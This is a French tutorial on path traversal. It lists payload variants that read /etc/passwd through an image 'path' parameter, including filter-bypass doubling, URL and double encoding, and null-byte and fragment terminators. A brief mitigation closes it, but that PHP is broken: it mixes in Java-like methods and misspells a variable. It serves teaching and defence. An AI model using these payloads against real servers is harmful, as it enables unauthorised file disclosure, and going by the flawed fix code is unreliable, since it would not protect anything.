# Introduction

La traversée de chemins consiste à manipuler les chemins de fichiers pour naviguer sur le système de fichiers du serveur distant.
```html
<img src="/images?path=chien.png"/>
```
Avec ce backend
```php
<= file_get_contents("/var/www/images" . $_GET["path"]); =>
```

En manipulant le chemin pour le traverser
```html
<img src="/images?path=../../../etc/passwd"/>
<!-- Forme /var/www/images/../../../etc/passwd résolu en /etc/passwd -->
```
> `/` pour unix/bsd
> `\` et `/` pour Windows
# Techniques de traversée
## Chemin absolu

>**But** : Se baser sur un chemin absolu jusqu'à la ressource.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- `/etc/passwd`
```html
<img src="/images?path=/etc/passwd"/>
```
## Chemin relatif

> **But** : Se baser sur le chemin relatif de la source d'images.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- `../../../etc/passwd`
```html
<img src="/images?path=../../../etc/passwd"/>
```
## Inclusion du dossier source

> **But** : Inclure le dossier source au début du chemin.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- `/var/www/images/../../../etc/passwd`
```html
<img src="/images?path=/var/www/images/../../../etc/passwd"/>
```
## Dédoublement

> **But** : échapper à la suppression de `../` dans le chemin par le serveur.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- `....//....//....//etc/passwd`
```html
<img src="/images?path=....//....//....//etc/passwd"/>
<!-- ..(../)/ : suppression du pattern ../ (entre parenthèses) donne ../
```
## Échappement

> **But** : échapper le caractère `/`.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- `..\/..\/..\/etc\/passwd`
```html
<img src="/images?path=..\/..\/..\/etc\/passwd"/>
```
## Encodage

> **But** : encoder le chemin 1, à 2 fois pour éviter les symboles suspects.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- Encodé une fois : `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
```html
<img src="/images?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"/>
```

- Encodé deux fois : `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
```html
<img src="/images?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"/>
```
## Terminaison avec extension requise

> **But** : présenter une extension et terminer le chemin prématurément avec différentes méthodes.
> **Astuce** : combiner avec d'autres techniques.
```html
<img src="/images?path=chien.png"/>
```

- Par `\0` : `../../../etc/passwd%00.png`
```html
<img src="/images?path=../../../etc/passwd%00.png"/>
```

- Par truandage `GET` : `../../../etc/passwd?format=png`
```html
<img src="/images?path=../../../etc/passwd"/>
```

- Par id `#` : `../../../etc/passwd#.png`
```html
<img src="/images?path=../../../etc/passwd#.png"/>
```
# Résolution

Utiliser les chemins canoniques et vérifier le préfixage.
```php
$cheminOriginel = "/var/www/images";
$entreeUtilisateur = $_GET["filename"];

// Recréation d'un chemin permettant l'interprétation et l'obtention du chemin canonoique
$chemin = recreerChemin($cheminOriginal, $entreeUtilisateur);

if ($chemin.getCanonicalPath().startsWith($cheminOriginel))
{
	// Logique
}
```